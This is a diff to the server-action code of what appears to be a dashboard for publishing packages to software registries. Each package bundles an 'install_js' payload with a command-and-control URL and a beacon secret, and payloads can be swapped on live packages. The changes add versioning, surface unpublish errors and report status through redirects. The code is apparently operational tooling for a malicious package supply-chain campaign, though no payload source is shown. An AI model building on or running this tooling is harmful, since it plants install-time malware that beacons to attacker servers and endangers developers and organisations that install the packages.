@@ -65,23 +65,25 @@ export async function publishPackageAction(formData: FormData) {
   const { success } = publishPackage(name, account.registry_url, account.token, account.c2_url, payload?.install_js, beaconSecret);
   db.prepare('UPDATE packages SET status = ? WHERE name = ?').run(success ? 'published' : 'failed', name);
 
-  redirect('/packages');
+  redirect(`/packages?published=${encodeURIComponent(name)}&status=${success ? 'ok' : 'fail'}`);
 }
 
 export async function deletePackageAction(formData: FormData) {
   const id = String(formData.get('id'));
   const row = db.prepare('SELECT p.name, a.registry_url, a.token FROM packages p LEFT JOIN accounts a ON p.account_id = a.id WHERE p.id = ?').get(id) as { name: string; registry_url: string | null; token: string | null } | undefined;
 
-  if (row?.registry_url) {
-    unpublishPackage(row.name, row.registry_url, row.token ?? null);
-  }
+  const { success: unpubOk, output: unpubOut } = row?.registry_url
+    ? unpublishPackage(row.name, row.registry_url, row.token ?? null)
+    : { success: true, output: '' };
   db.prepare('DELETE FROM packages WHERE id = ?').run(id);
+  if (!unpubOk) redirect(`/packages?unpublish_error=${encodeURIComponent(unpubOut.slice(0, 200))}`);
   redirect('/packages');
 }
 
 export async function switchPayloadAction(formData: FormData) {
   const pkgId = String(formData.get('pkg_id'));
   const payloadId = String(formData.get('payload_id'));
+  const version = String(formData.get('version') || '1.0.0').trim();
 
   const pkg = db.prepare('SELECT p.*, a.registry_url, a.token, a.c2_url FROM packages p LEFT JOIN accounts a ON p.account_id = a.id WHERE p.id = ?').get(pkgId) as { id: number; name: string; registry_url: string | null; token: string | null; c2_url: string | null } | undefined;
   const payload = db.prepare('SELECT * FROM payloads WHERE id = ?').get(payloadId) as Payload | undefined;
@@ -92,10 +94,10 @@ export async function switchPayloadAction(formData: FormData) {
 
   const beaconSecret = (db.prepare("SELECT value FROM settings WHERE key = 'beacon_secret'").get() as { value: string } | undefined)?.value ?? '';
 
-  // unpublish existing version, then republish with new payload
+  // unpublish existing version, then republish with new payload + version
   unpublishPackage(pkg.name, pkg.registry_url!, pkg.token ?? null);
-  const { success } = publishPackage(pkg.name, pkg.registry_url!, pkg.token ?? null, pkg.c2_url!, payload!.install_js, beaconSecret);
+  const { success } = publishPackage(pkg.name, pkg.registry_url!, pkg.token ?? null, pkg.c2_url!, payload!.install_js, beaconSecret, version);
 
-  db.prepare('UPDATE packages SET payload_id = ?, status = ? WHERE id = ?').run(payloadId, success ? 'published' : 'failed', pkgId);
-  redirect(`/packages/${pkgId}`);
+  db.prepare('UPDATE packages SET payload_id = ?, status = ?, version = ? WHERE id = ?').run(payloadId, success ? 'published' : 'failed', version, pkgId);
+  redirect(`/packages/${pkgId}?republished=1&status=${success ? 'ok' : 'fail'}`);
 }
